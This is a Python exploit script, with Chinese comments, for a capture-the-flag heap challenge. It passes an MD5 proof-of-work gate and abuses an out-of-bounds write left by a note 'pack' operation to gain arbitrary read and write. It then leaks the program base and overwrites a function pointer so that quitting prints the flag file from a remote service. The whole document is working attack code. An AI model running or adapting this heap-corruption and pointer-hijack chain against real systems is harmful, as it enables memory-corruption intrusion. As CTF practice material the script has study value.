#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve_514.py -- 玄机 514 "Ancient-Recall-HHB2026"   用法: python3 solve_514.py HOST PORT

利用链 (实测):
  1) PoW 网关 (补 4 大写字母使 MD5(token)==给定值)
  2) A=create(reserve=512,len=512,0x41*512) -> pack : 真实 chunk 收缩到 0x20, cap 仍 520 -> 越界读写
  3) 之后 create 的笔记 B 紧贴 A: struct chunk(0x40) 在 A_user+0x20, 其布局 {cap@0x20,len@0x28,buf@0x30,title@0x38}
  4) edit A 写 0x38 字节覆写 B 的 {cap,len,buf} -> show B = 任意读; edit B = 任意写
  5) 堆里定位全局 arc 结构 (heap_start+0x2a0: "./flag", +0x20:"closing archive", +0x40: fn=&fn_1311)
  6) 读出 fn 指针 -> ELF/PIE base = fn - 0x1311 (低 12 位 0x311, base 页对齐)
  7) 任意写把 arc->fn 改成 base+0x1330 (cat_file: fopen(path);fread;write(1,...))
  8) 发送菜单 6 (quit) -> arc->fn(arc) -> cat_file("./flag") -> 打印 flag
"""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32763
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", bytes(b[:8]).ljust(8, b"\x00"))[0]
FLAG_RE = re.compile(rb"(?:[A-Za-z0-9_]{2,16})\{[!-~]{3,120}\}")


def drain(s, wait=0.8, bufsize=1 << 20):
    s.settimeout(0.2); buf = b""; end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]; fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        b = drain(self.s, 1.5)
        m1 = re.search(rb"Token:\s*([A-Za-z_]+)", b); m2 = re.search(rb"MD5:\s*([0-9a-f]{32})", b)
        if not (m1 and m2):
            raise SystemExit("no pow banner (instance down?): %r" % b[:120])
        ans = solve_pow(m2.group(1).decode(), m1.group(1).decode())
        print("[pow] %s -> %s" % (m1.group(1).decode(), ans), flush=True)
        self.send(ans, 1.4)

    def send(self, line, wait=0.7):
        try:
            self.s.sendall(str(line).encode() + b"\n")
        except OSError:
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length); return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3); return self.send(idx, wait)

    def pack(self, idx):
        self.send(4); return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)

# ---- 布局 ----
c.create(0, "A", 512, 512, "41" * 512); c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)
d = None
for _ in range(4):
    d = parse(c.show(0, wait=1.4))
    if d:
        break
if not d:
    raise SystemExit("show(0) failed")
A_USER = u64(d[2][0x30:0x38]) - 0x60
top = u64(d[2][0x168:0x170])
heap_start = A_USER + 0x160 + (top & ~0xf) - 0x21000
print("[heap] A_user=0x%x heap_start=0x%x" % (A_USER, heap_start), flush=True)


def set_bptr(addr, n):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41)
    p[0x20:0x28] = p64(n); p[0x28:0x30] = p64(n); p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())


def arb_read(addr, n, wt=1.3):
    set_bptr(addr, n)
    r = c.show(1, wait=wt + n / 8000.0)
    dd = parse(r)
    return dd[2][:n] if (dd and len(dd[2]) >= n) else None


def arb_write(addr, data):
    set_bptr(addr, len(data))
    c.edit(1, len(data), data.hex())


# ---- 定位全局 arc 结构 ----
win = arb_read(heap_start, 0x400)
i = win.find(b"./flag")
if i < 0:
    raise SystemExit("arc struct not found")
arc = heap_start + i
print("[arc] 0x%x  %r" % (arc, win[i:i + 0x48]), flush=True)
fn = u64(win[i + 0x40:i + 0x48])
print("[fn ] 0x%x" % fn, flush=True)
base = fn - 0x1311
print("[base] 0x%x  (page-aligned=%s)" % (base, hex(base & 0xfff)), flush=True)
magic = arb_read(base, 4)
print("[elf] %s" % (magic.hex() if magic else None), flush=True)
if not magic or magic != b"\x7fELF":
    raise SystemExit("bad base")

cat_file = base + 0x1330
print("[*] overwrite arc->fn 0x%x -> cat_file 0x%x" % (fn, cat_file), flush=True)
arb_write(arc + 0x40, p64(cat_file))

print("[*] send quit (6) ...", flush=True)
out = c.send(6, 2.0)
print("[quit resp] %r" % out, flush=True)
m = FLAG_RE.search(out)
if not m:
    extra = c.send(6, 1.0)   # 再试一次
    out += extra
    m = FLAG_RE.search(out)
print("\n================ RESULT ================", flush=True)
print("FLAG: %s" % (m.group(0).decode() if m else "(NOT FOUND) %r" % out[:400]), flush=True)
try:
    c.s.close()
except Exception:
    pass